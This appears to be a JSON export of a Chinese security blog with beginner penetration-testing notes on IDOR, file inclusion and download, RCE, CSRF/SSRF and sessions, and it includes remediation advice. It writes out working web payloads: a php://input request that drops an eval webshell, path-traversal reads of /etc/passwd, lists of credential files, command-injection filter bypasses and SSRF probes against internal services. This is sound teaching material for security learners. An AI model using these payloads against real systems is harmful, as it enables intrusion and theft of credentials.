{"meta":{"title":"J3fffff's Blog","subtitle":"","description":"","author":"Jeff","url":"https://j3f5.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-05-22T08:59:44.739Z","updated":"2023-05-22T08:59:44.739Z","comments":false,"path":"/404.html","permalink":"https://j3f5.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-05-26T05:23:00.823Z","updated":"2023-05-26T05:23:00.823Z","comments":false,"path":"about/index.html","permalink":"https://j3f5.github.io/about/index.html","excerpt":"","text":"此文档收录比较有用的资源链接 目前的方向 [ ] java审计 [ ] WAF初识 [ ] 安卓取证与对应攻击 [ ] 车联网渗透基础 [ ] web渗透基础 优秀课程 全套渗透 小迪安全 笔记1：https://www.yuque.com/gemaxianrenhm/hahwdw 笔记2：https://www.cnblogs.com/SnowSec/category/1908585.html 笔记3：https://blog.csdn.net/mctsog/category_11584480_2.html 暗月渗透 知识论坛 全面 CN-SEC中文网：https://cn-sec.com/ IOT IOTsec-Zone：https://iotsec-zone.com/ 知识库 大类库 https://github.com/YinWC/Security_Learning"},{"title":"分类","date":"2023-05-22T08:59:44.741Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"categories/index.html","permalink":"https://j3f5.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-05-22T10:10:32.005Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"books/index.html","permalink":"https://j3f5.github.io/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":false,"path":"repository/index.html","permalink":"https://j3f5.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":true,"path":"links/index.html","permalink":"https://j3f5.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-05-22T08:59:44.743Z","updated":"2023-05-22T08:59:44.743Z","comments":false,"path":"tags/index.html","permalink":"https://j3f5.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"逻辑漏洞-水平垂直越权","slug":"逻辑漏洞-水平垂直越权","date":"2023-06-03T02:40:31.000Z","updated":"2023-06-03T02:40:31.000Z","comments":true,"path":"articles/2023/06/03/逻辑漏洞-水平垂直越权/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/","excerpt":"","text":"概述 概念 水平：A与B是同一个权限，但是A可以访问B的数据 垂直：B是高权限用户，而A是低权限，A可以访问B的数据 未授权访问：通过删除请求中的认证信息后，发起 重放攻击 仍然可以访问或者完成操作 水平越权操作 看一下A中可以实现的功能，然后，抓包。【例如：账户名Kobe，然后有个查看信息的操作】 看抓包中的参数，更改参数。【例如想查看账户Lucy的详细信息，更改http://.../?name=kobe&amp;submit=...中kobe变成lucy】 怎么知道有Lucy这个人？信息搜集+注册框显示是否存在此用户+访问其他个人空间查看用户名 如果返回成功，那就存在水平越权 垂直越权操作 先去admin界面操作并抓到包/看到相关界面（例如在普通用户界面有的按钮是灰色，然后猜解数据包的构成） 更换猜解/抓到的admin操作数据包，然后替换普通用户的cookie 如果操作成功，那就存在垂直越权漏洞 前提条件：（获取admin的操作数据包，那么怎么来的数据包？） 普通用户前端有操作界面可以抓取操作数据包 通过网站源码本地搭建模拟抓取 盲猜 资源","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"业务逻辑","slug":"业务逻辑","permalink":"https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"}]},{"title":"文件包含与下载读取基础","slug":"文件包含与下载读取基础","date":"2023-06-02T08:00:56.000Z","updated":"2023-06-02T08:00:56.000Z","comments":true,"path":"articles/2023/06/02/文件包含与下载读取基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件包含 即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，这样，如果我们能控制这些参数，就可以进行文件包含。 利用： 有相关的包含函数 该函数内参数可控 常见代码以及脚本函数 造成包含的常见脚本代码 1234567891011&lt;!--#include file=&quot;1.asp&quot; --&gt;&lt;!--#include file=&quot;top.aspx&quot; --&gt;&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;&lt;jsp:include page=&quot;head.jsp&quot;/&gt;&lt;%@ include file=&quot;head.jsp&quot;%&gt;&lt;?php include(&#x27;test.php&#x27;)?&gt; 脚本函数 PHP include()：当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。 include_once()：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。 include_once()：可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题 require()：当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。 require_once()：require_once表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 检测 这里的检测也分白盒黑盒，都差不多老三样 白盒：代码审计 黑盒 公开漏洞 漏扫工具 手工查看参数和功能点 类型与绕过 类型 远程包含（RFI） 本地包含（LFI） 绕过 本地有限制包含 %00截断 条件：magic_quotes_gpc = Off php版本&lt;5.3.4 路径长度截断 条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。 ​ 点号.截断 条件：windows OS，点号需要长于256 远程有限制包含 PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 12allow_url_fopen = On（是否允许打开远程文件）allow_url_include = On（是否允许include/require远程文件） 1234&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename.&quot;.html&quot;);?&gt; 这个限制了包含文件的格式。但是可以绕过。 使用?号：www.xxx.com/include.php?filename=myfile.php? 即把后面的当做参数 使用#(%23)：www.xxx.com/include.php?filename=myfile.php%23 即把后面的当做HTML标签 使用 空格(%20)：www.xxx.com/include.php?filename=myfile.php%20 利用 - php java curl(ssrf) asp 利用 http/https √ √ √ √ gopher √ before JDK1.7 before 7.49.0 不支持\\x00 before version 3 ftp √ √ √ √ file √ √ √ √ dict –with-curlwrappers × √ × imap/pop3 –with-curlwrappers × √ × rtsp –with-curlwrappers √ √ √ smb –with-curlwrappers √ √ √ smtp –with-curlwrappers × √ × telnet –with-curlwrappers × √ × ssh2 受限于allow_url_fopen × × × ogg 受限于allow_url_fopen × × × ldap × × × × php √ × × × zlib/bzip2/zip 受限于allow_url_fopen × × × PHP专属伪协议 协议 测试PHP版本 allow_url_fopen allow_url_include 用法 file:// &gt;=5.2 off/on off/on ?file=file:///user/desktop/file.txt php://filter &gt;=5.2 off/on off/on ?file=php://filter/read=convert.base64-encode/resource=./index.php php://input &gt;=5.2 off/on on ?file=php://input[POST DATA] &lt;?php phpinfo()?&gt;注：当enctype=”multipart/form-data”时，php://input是无效的。常用：http://127.0.0.1/include.php?file=php://input&lt;br/&gt;[POST DATA部分]&lt;br/&gt;&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt; compress.bzip2:// &gt;=5.2 off/on off/on ?file=compress.bzip2://D:/soft/phpStudy/WW/file.bz2[or]?file=compress.bzip2://./file.bz2 compress.zlib:// &gt;=5.2 off/on off/on ?file=compress0zlib//D:/soft/phpStudy/WWW/filegz[or]?file=compress.zlib://./file.gz data:// &gt;=5.2 on on ?file=data://text/plain,&lt;?php phpinfo()?&gt;[or]?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=也可以:?file=data:text/plain,&lt;?php phpinfo0?&gt;[or]?file=data:text/plain:base64,PD9waAacGhwaW5mbyapPz4= http:// filter:// php://filter/read=convert.base64-encode/resource=[文件名]http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php phar:// 步骤：写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 再用解压函数phar解压即可：?file=phar://压缩包/内部文件 zip:// 相反，这个是压缩函数。用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] 。例如：zip://xxx.png#shell.php PHP伪协议 事实就是支持的协议和封装的协议12种 1234567891011file:// - 访问本地文件系统http:// - 访问http网站ftp:// - 访问FTP（s）URLSphp:// - 访问各个输入输出流zlib:// - 压缩流data：// - 数据（RFC 2397）glob：// -查找匹配的文件路径模型ssh2：// - Secure Shell 2rar:// - RARogg:// - 音频流expect:// - 处理交互式的流 php.ini参数设置 在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。 allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； 修复 文件下载 注意区别： 文件被解析：文件包含 显示源代码：文件读取 提示文件下载：文件下载 一般链接形式与攻击思路 抓URL，看URL上有什么下载形式的URL 就是在一些下载按钮那，然后你改一下下面的链接就可以下载其他文件了。例如提取下载链接：http://..../?s=asdfagqrebvz==是个base64，我们下载一个文件，观察其文件名，然后把后面的Base64解码，看目录，对应着文件名就可以实现任意文件下载了。 123456download.php?path=download.php?file=down.php?file=data.php?file=readfile.php?file=read.php?filename= 包含参数 1234567891011121314151617181920&amp;RealPath=&amp;FilePath=&amp;ﬁlepath=&amp;Filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;Inputfile=&amp;url=&amp;urls=&amp;Lang=&amp;dis=&amp;data=&amp;Data=&amp;readﬁle=&amp;ﬁlep=&amp;src=&amp;menu=META-INFWEB-INF 漏洞利用 任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。 1234index.php?f=…/…/…/…/…/…/etc/passwdindex.php?f=…/index.phpindex.php?f=ﬁle:///etc/passwdreadfile.php?file=/etc/passwd 常见文件&amp;敏感文件 后台首页日志等可见文件（常见） 数据库配置文件 各种接口文件 密钥信息等文件 常见的敏感文件路径 Windows C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 C:\\Windows\\win.ini //Windows系统的一个基本系统配置文件 Linux /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //记录每个访问计算机用户的公钥 /etc/passwd //账户信息 /etc/shadow //账户密码文件 /etc/my.cnf //mysql配置文件 /etc/httpd/conf/httpd.conf //apache配置文件 /root/.bash_history //用户历史命令记录文件 /root/.mysql_history //mysql历史命令记录文件 /proc/mounts //记录系统挂载设备 /porc/config.gz //内核配置文件 /var/lib/mlocate/mlocate.db //全文件路径 /porc/self/cmdline //当前进程的cmdline参数 /usr/local/app/php5/lib/php.ini //PHP配置文件 漏洞修复 部署WAF产品 过滤.，使用户在url中不能回溯上级目录 正则严格判断用户输入参数的格式 配置限定文件访问范围，目录权限设置或单独文件权限设置 将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：http://www.test.com/download?filename=文件名 净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。 任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。 要下载的文件地址保存至数据库中。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 记录文件下载日志。 文件读取 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。 漏洞产生原因： 任意语言代码读取功能函数 文件读取函数：readfile()、file_get_contents()、fopen()中 $filename没有经过校验或者校验不合格 用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini 漏洞检测 手工查看参数值及功能点（资源下载） 漏洞利用 readfile.php?f=../../../../../../etc/passwd 读取文件：配置文件（数据库，平台，各种敏感文件等） 实例 java web目录 [RoarCTF 2019]Easy Java 一般来说，java web的配置文件必定存在于网页目录：WEB-INF/web.xml，里面有路由以及对应的servlet名等。 Tricks： GET下载不了就换成POST。注意：单纯的修改是不行的，需要用Hackbar发送一个POST包才行。 java WEB-INF/web.xml文件泄露。所有源码文件都在class文件里，组件com.???.???实际上是文件夹com/???/???。 小米路由CNVD漏洞 任意文件读取可以登录后台。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件读取","slug":"文件读取","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"RCE基础-代码执行&命令执行","slug":"RCE基础-代码执行&命令执行","date":"2023-06-02T00:56:20.000Z","updated":"2023-06-02T00:56:17.000Z","comments":true,"path":"articles/2023/06/02/RCE基础-代码执行&命令执行/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"RCE概述 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类： 代码执行 因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞 命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 注意的是，如果想要挖掘这样的漏洞，如果这个网站本身不需要这些功能，那么基本上就没有这些漏洞出现。所以此漏洞可利用的条件： 有该拓展环境 漏洞函数 可控变量 RCE函数相关 PHP 代码执行 eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort() eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。 命令执行 system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、反引号与$() 有回显（执行并回显） 12&lt;?php system(&#x27;ls&#x27;);?&gt;&lt;?php passthru(&#x27;ls&#x27;);?&gt; 无回显（执行但不回显） 12345&lt;?php echo &quot;&lt;pre&gt;&quot;; echo exec(&#x27;ls&#x27;); echo &quot;&lt;/pre&gt;&quot;;?&gt; 12345&lt;?php echo &quot;&lt;pre&gt;&quot;; echo shell_exec(&#x27;ls&#x27;); echo &quot;&lt;/pre&gt;&quot;;?&gt; JAVA（命令执行） 在Java 开发语言中可以执行系统命令的函数有： Runtime.getRuntime.exec ProcessBuilder.start 其中，Runtime.getRuntime.exec 是在Java1.5 之前提供的，Java1.5 之后则提供了ProcessBuilder 类来构建进程 ProcessBuilder Java.lang.ProcessBuilder 类用于创建操作系统进程，每个ProcessBuilder 实例管理一个进程属性集。start() 方法利用这些属性创建一个新的Process 实例， 可以利用ProcessBuilder 执行命令。 ProcessBuilder 执行命令的方式如下： 12ProcessBuilder pb = new ProcessBuilder(&quot;myCommand&quot;, &quot;myArg&quot;); //ProcessBuilder p = new ProcessBuilder(&quot;ls&quot;,&quot;-al&quot;);Process process = pb.start(); Runtime.getRuntime java.lang.Runtime 公共类中的exec()方法同样也可以执行系统命令，exec()方法的使用方式有以下6 种： 123456789101112//在单独的进程中执行指定的字符串命令public Process exec(String command)//在单独的进程中执行指定的命令和参数public Process exec(String[] cmdarray)//在具有指定环境的单独进程中执行指定的命令和参数public Process exec(String[] cmdarray, String[] envp)//在具有指定环境和工作目录的单独进程中执行指定的命令和参数public Process exec(String[] cmdarray, String[] envp, File dir)//在具有指定环境的单独进程中执行指定的字符串命令public Process exec(String command, String[] envp)//在具有指定环境和工作目录的单独进程中执行指定的字符串命令public Process exec(String command, String[] envp, File dir) 正常执行： 1Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1&quot;); 与ProcessBuilder不同的是，如果他要执行多条命令，则需要输入数组，而非简单拼接： 123Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1;ls&quot;);//运行错误String[] command = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping -t 3 127.0.0.1;id&quot;&#125;;Process pro = Runtime.getRuntime().exec(command);//执行成功，他是直接调用了ProcessBuilder执行 所以产生拼接的命令执行漏洞就得按上面的写法，不然还不能拼接~ 除此之外，使用这个函数还有很多需要注意的点： 字符串执行需要替换空格（$&#123;IFS&#125;、$IFS$9）： 如果exec 方法执行的参数是字符串参数，参数中的空格会经过StringTokenizer 处理，处理完成后会改变原有的语义导致命令无法正常执行。例如： 12345cmd=sh -c ls;cat /etc/passwd //执行失败cmd=sh -c ls;id //执行成功cmd=sh -c ls;cat$&#123;IFS&#125;/etc/passwd //执行失败，因为我们的请求中包含无效的字符&#123;&#125;，它不属于保留字符，所以出错！cmd=sh%20-c%20ls;cat$%7BIFS%7D/etc/passwd //编码后执行成功，当然也可以使用$IFS$9 挖掘与防范 挖掘 黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。 白盒测试：查看命令执行函数是否做过滤。命令执行函数上述有提到 后面将会讲到其他漏洞的复现 防范 敏感函数禁用，尽量不要使用命令执行函数，不能完全控制的危险函数最好不使用。 在进入执行命令函数前进行严格的检测和过滤； 部署WAF 多使用安全API，而不直接利用命令执行函数 利用与绕过 代码注入 利用：利用后端脚本的特殊性对服务器进行攻击。 PHP： phpinfo可以获取到很多信息。例如收集绝对路径**，真实ip，绕过xss的httponly($_SERVER[“HTTP_COOKIE”])，存在oci8推测数据库可能为oracle。 eval写一句话木马getshell之类的。 其绕过方式一般都是替换关键字、关键字大小写、编码等等过滤了PHP代码，可以使用=绕过：&lt;?=eval($_REQUEST['cmd']);?&gt; 命令注入 利用该漏洞实际上就是通过管道符、拼接符等方式进行命令注入而达到攻击的目的。 这里写绕过姿势： 黑名单绕过： 关键字绕过 双引号：l''s 反斜杠：l\\s 倒过来写：tac == cat 替换： cat可以由以下来代替 (1)more:一页一页的显示的显示档案内容 (2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页 (3)head:查看头几行 (4)tac:从最后一行开始显示,可以看出tac是cat的反向显示 (5)tail:查看尾几行 (6)nl:显示的时候,顺便输出行号 (7)od:以二进制的方式读取档案内容 (8)vi:一种编辑器，这个也可以查看 (9)vim:一种编辑器,这个也可以查看 (10)sort:可以查看 (11)uniq:可以查看 (12)file -f:报错出具体的内容 (13)base64:输出然后自己解码就好 空格绕过 &lt;&gt;重定向：cat&lt;flag_123 $IFS$9, $&#123;IFS&#125;空字符 逗号与{}：&#123;cat,flag_123&#125; 管道符&amp;，;，|等被过滤（注意，windows不支持;） linux: %0a 回车 %0d 换行 windows: %0a 回车 %1a 作为.bat文件的命令分隔符 其他 管道符的含义 Window系列支持的管道符如下所示。 &quot; | &quot;:直接执行后面的语句。例如：ping 127.0.0.1 | whoami。 “ || ”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 127.0.0.1 || whoami &quot; &amp; &quot; :如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如： ping 127.0.0.1 &amp;whoami。 “ &amp;&amp; ”： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1 &amp;&amp; whoami。 Linux 系统支持的管道符如下所示： “；”执行完前面的语句再执行后面的。例如: ping 127.0.0.1;whoami “ | ”：显示后面语句的执行结果。例如: ping 127.0.0.1 | whoami。 “ || ”： 当前面的语句执行出错时，执行后面的语句。例如： ping 1|| whoami。 “ &amp; ”： 如果前面的语句执行为假则直接执行后面的语句。前面的语句可真可假。例如：ping 127.0.0.1 &amp; whoami。 “ &amp;&amp; ”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： ping 127.0.0.1 &amp;&amp; whoami。 POC与EXP POC是验证 EXP是利用 TIPS 一般使用base64输出文件内容，因为有的字符没办法在屏幕上看见","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"}]},{"title":"CSRF与SSRF漏洞基础","slug":"CSRF与SSRF漏洞基础","date":"2023-06-01T06:59:49.000Z","updated":"2023-06-01T06:59:49.000Z","comments":true,"path":"articles/2023/06/01/CSRF与SSRF漏洞基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","excerpt":"","text":"CSRF 概念以及原理 Cross Site Request Forgery，跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击。 顾名思义，也就是在a.com可以执行（发送）b.com的请求，例如请求b.com删除某个数据。 详细： 攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作 XSS 利用站点内内的信任用户，盗取cookie，CSRF通过伪装成受信任用户请求受信任的网站，利用目标用户的合法身份，以目标的名义执行某些非法参数 利用条件： 已经登录系统 用户访问URL 已存在的网站中让用户跳转 防御 当用户发送重要的请求时输入验证码 设置随机TOKEN —数据包的唯一值 检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败） 限制请求方式只能为post。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块 SSRF 概念、原理与相关注意点 Server-Side Request Forgery，服务器端请求伪造)，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 攻击目标：SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 形成原因：由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 可能出现的地方 可能出现的地方 社交分享功能：获取超链接的标题等内容进行显示 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译：给网址翻译对应网页的内容 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 数据库内置功能：数据库的比如mongodb的copyDatabase函数 邮件系统：比如接收邮件服务器地址 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 漏洞检测 一般发起网络请求中会使用libcurl库，所以他会有各种协议（可以简单执行curl -V）各个协议调用探针：http,file,dict,ftp,gopher 等 漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等 1234http://192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21 代码层面 PHP 123file_get_contents()fsockopen()curl_exec() 以上三个函数使用不当会造成SSRF漏洞 需要注意以下几点： 大部分 PHP 并不会开启 fopen 的 gopher wrapper file_get_contents 的 gopher 协议不能 URLencode file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败 curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用 curl_exec() //默认不跟踪跳转 file_get_contents() // file_get_contents支持php://input协议 JAVA 1Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类 以上几种类引用不当会造成SSRF 网络请求支持的协议如下 http，https，file，ftp，mailto，jar，netdoc 对比php的ssrf，java这块利用相对局限 绕过 数字IP（十进制IP等等） ?@#特殊符号绕过：www.baidu.com?www.me.com 子域名绕过 跳转IP（中转IP） DNS重绑定（例如短地址） 利用 攻击内网进行扫描，识别服务器指纹并攻击 对主机进行端口扫描 运行主机内程序 读取内网信息（file协议） 需要注意的是，回显是能否成功利用的重要的条件，在某些场景协议限定为HTTP模式且没有回显，利用 会相对复杂了。 协议利用 DICT：除了泄露安装软件版本信息，还可以查看端口，**操作内网redis服务（只能一条指令一条指令地发送）**等 File：读取文件 Gopher：万能协议（利用Gopher攻击Redis、攻击Fastcgi 等 FTP(S)/SMB(S)：匿名访问及爆破 Tftp：UDP协议 发送UDP数据包 Telnet：SSH/Telnet匿名访问及爆破 漏洞利用小技巧 crontab -l 显示当前计划任务 crontab -r 清除当前计划任务 端口转发工具 socat 在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php 防御 统一错误信息 协议限制：http &amp;&amp; https 内网IP限制 域名限制 需要一直解析到IP为止 URL白名单 正则匹配 禁止30x跳转 绕过 数字IP（十进制IP等等） ?@#特殊符号绕过：www.baidu.com?www.me.com、www.a.com@10.10.10.1 子域名绕过 跳转IP（中转IP） DNS重绑定（例如短地址） 指向任意IP的域名：xip.io 常见SSRF漏洞 Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf discuz! 的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换） weblogic的ssrf","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://j3f5.github.io/tags/SSRF/"}]},{"title":"授权与跨域共享","slug":"授权与跨域共享","date":"2023-05-31T02:02:30.000Z","updated":"2023-05-31T02:02:30.000Z","comments":true,"path":"articles/2023/05/31/授权与跨域共享/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/","excerpt":"","text":"认证、授权与凭证的概念 认证：验证当前用户的身份。例如有一个登陆窗口，只有输入正确的账号密码就算认证成功。 授权：用户授予第三方应用访问该用户某些资源的权限。例如有一个模特，经过一些协定，这模特把自己的肖像权授予商家使用。 凭证：实现认证和授权的前提是需要一种媒介（证书）。例如认证中的账号密码，例如授权中的协定。 COOKIE HTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息）。服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。 cookie 存储在客户端： cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。 cookie 是不可跨域的： 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，一级域名和二级域名之间是允许共享使用的（靠的是 domain）。 重要属性： httpOnly 如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全 SESSION session 是另一种记录服务器和客户端会话状态的机制 session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中 session 认证流程： 用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session 请求返回时将此 Session 